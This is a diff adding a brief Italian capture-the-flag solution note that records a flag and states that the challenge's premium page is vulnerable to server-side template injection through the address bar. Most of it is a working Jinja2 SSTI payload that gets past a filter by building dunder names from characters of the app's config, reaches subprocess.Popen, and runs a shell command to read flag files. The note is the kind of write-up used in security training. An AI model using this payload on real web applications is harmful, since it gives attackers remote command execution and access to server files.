@@ -1,0 +1,5 @@
+flag{1s_t3mpl4t3_inj3c7ion_c00l?}
+
+la ppagina premium si può fare un template injection, nella riga dell'indirizzo meettere questo 
+
+{{[][config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2][ config["FLAG"][61]*2 + "mro" + config["FLAG"][61]*2][1][config["FLAG"][61]*2+"subclasses"+config["FLAG"][61]*2]()[360]("cat /flag*",shell=True,stdout=-1)["communicate"]()[0]}}
